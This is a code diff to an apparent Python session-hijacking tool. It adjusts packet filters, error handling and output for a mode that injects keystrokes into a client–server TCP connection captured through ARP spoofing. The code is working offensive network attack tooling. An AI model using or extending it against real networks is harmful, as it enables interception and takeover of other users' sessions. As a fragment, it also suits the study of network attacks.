@@ -158,7 +158,7 @@ try:
                             ip_pk.src_addr == client_ip or \
                                     ip_pk.dst_addr == server_ip,
                             tcp_seg.src_port == client_port or \
-                                    tcp_seg.dst_port == server_port
+                                    tcp_seg.dst_port == client_port
                                     ]
                     if all(hijack_filter):
                         continue
@@ -185,7 +185,11 @@ try:
                     if ord(ch) == 10:
                         last_cmd = current_cmd
                         current_cmd = ''
-                    tcp_handler.send(ch.encode())
+                    try:
+                        tcp_handler.send(ch.encode())
+                    except errors.NoTCPConnectionException as e:
+                        tools.print_rgb('TCP not open; Aborting...',
+                                rgb=(200, 100, 100), bold=True)
             else:
                 if ch in ('h', 'H'):
                     tools.print_rgb('entering hijacking mode',
@@ -207,13 +211,13 @@ try:
                     termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
         if hijacked:
             data = tcp_handler.receive(65535).decode()
-            if data != last_cmd:
+            if data != last_cmd and data != '\n' and data != '':
                 print(data, end='')
 finally:
     termios.tcsetattr(sys.stdin, termios.TCSADRAIN, term_attr)
     if hijacked:
         tcp_handler.close()
-    tools.print_rgb('\n\nCtrl-C -- Handing connections over...',
+    tools.print_rgb('\n\nstop ARP spoofing',
             rgb=(200, 0, 0), bold=True, end='')
     arp_data_client = {'operation': 2,
             'src_addr': my_mac,
